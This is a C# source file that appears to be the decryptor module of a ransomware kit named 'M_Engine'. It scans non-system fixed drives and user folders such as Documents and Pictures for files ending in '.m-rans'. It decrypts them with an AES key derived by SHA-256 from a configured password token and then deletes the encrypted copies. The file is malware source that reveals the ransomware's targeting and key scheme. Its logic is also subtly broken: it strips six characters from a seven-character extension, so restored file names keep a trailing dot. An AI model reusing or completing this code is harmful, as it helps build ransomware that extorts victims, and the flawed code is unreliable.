using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace M_Engine
{
    internal class ungeloo
    {
        private static readonly string Password = config.PassToken;
        private static readonly int MaxDegreeOfParallelism = 10;

        public static void StartDecryption()
        {
            string systemDrive = Environment.GetEnvironmentVariable("SystemDrive").ToUpper();

            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo drive in drives)
            {
                string driveRoot = drive.RootDirectory.FullName;

                if (drive.DriveType == DriveType.Fixed && !driveRoot.StartsWith(systemDrive))
                {
                    Console.WriteLine($"Starting decryption on: {driveRoot}");
                    DecryptFilesInDirectory(driveRoot);
                }
            }

            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string[] foldersToDecrypt = { "Downloads", "Documents", "Pictures", "Videos", "Desktop" };

            foreach (string folder in foldersToDecrypt)
            {
                string path = Path.Combine(userProfile, folder);
                if (Directory.Exists(path))
                {
                    Console.WriteLine($"Decrypting folder: {path}");
                    DecryptFilesInDirectory(path);
                }
            }

            Console.WriteLine("Decryption completed successfully.");
        }

        private static void DecryptFilesInDirectory(string directoryPath)
        {
            try
            {
                string[] files = Directory.GetFiles(directoryPath, "*.m-rans", SearchOption.AllDirectories);

                var tasks = new List<Task>();

                foreach (var file in files)
                {
                    if (tasks.Count >= MaxDegreeOfParallelism)
                    {
                        Task.WhenAny(tasks).Wait();
                        tasks.RemoveAll(t => t.IsCompleted);
                    }

                    var decryptTask = Task.Run(() => DecryptFile(file));
                    tasks.Add(decryptTask);
                }

                Task.WhenAll(tasks).Wait();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error accessing directory {directoryPath}: {ex.Message}");
            }
        }

        private static void DecryptFile(string filePath)
        {
            string originalFilePath = filePath.Substring(0, filePath.Length - 6);

            if (!filePath.EndsWith(".m-rans")) return;

            try
            {
                using (Aes aes = Aes.Create())
                {
                    byte[] key = GenerateKey(Password, aes.KeySize / 8);
                    byte[] iv = new byte[aes.BlockSize / 8];

                    using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                    {
                        inputFileStream.Read(iv, 0, iv.Length);

                        using (FileStream outputFileStream = new FileStream(originalFilePath, FileMode.Create, FileAccess.Write))
                        using (CryptoStream cryptoStream = new CryptoStream(inputFileStream, aes.CreateDecryptor(key, iv), CryptoStreamMode.Read))
                        {
                            cryptoStream.CopyTo(outputFileStream);
                        }
                    }
                }

                File.Delete(filePath);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error decrypting {filePath}: {ex.Message}");
            }
        }

        private static byte[] GenerateKey(string password, int keySize)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] keyBytes = Encoding.UTF8.GetBytes(password);
                byte[] hash = sha256.ComputeHash(keyBytes);
                Array.Resize(ref hash, keySize);
                return hash;
            }
        }
    }
}
